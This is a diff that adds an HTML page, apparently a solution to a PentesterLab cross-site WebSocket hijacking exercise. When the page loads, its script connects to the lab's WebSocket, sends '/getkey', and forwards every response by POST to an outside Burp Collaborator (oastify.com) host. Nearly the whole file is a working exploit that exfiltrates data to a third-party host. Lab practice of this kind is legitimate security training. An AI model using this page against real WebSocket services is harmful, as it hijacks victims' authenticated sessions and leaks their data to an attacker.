@@ -1,0 +1,26 @@
+<html>
+
+<head>
+    <title>PentesterLab Walkthrough</title>
+    <meta charset="utf-8" />
+</head>
+
+<body>
+    <!-- Pentesterlab Exercise: https://pentesterlab.com/exercises/cswsh -->
+    <script>
+        document.addEventListener("DOMContentLoaded", function (e) {
+            var socket = new WebSocket("ws://ptl-5eb5f0260561-3842b35c53c2.libcurl.me/");
+
+            // Отправляем команду для получения флага
+            socket.onopen = function (event) {
+                socket.send("/getkey");
+            };
+
+            socket.onmessage = function (event) {
+                fetch("https://ozrq4nny708is07b087mh4110s6juci1.oastify.com/", { method: "POST", mode: "no-cors", body: event.data });
+            };
+        });
+    </script>
+</body>
+
+</html>
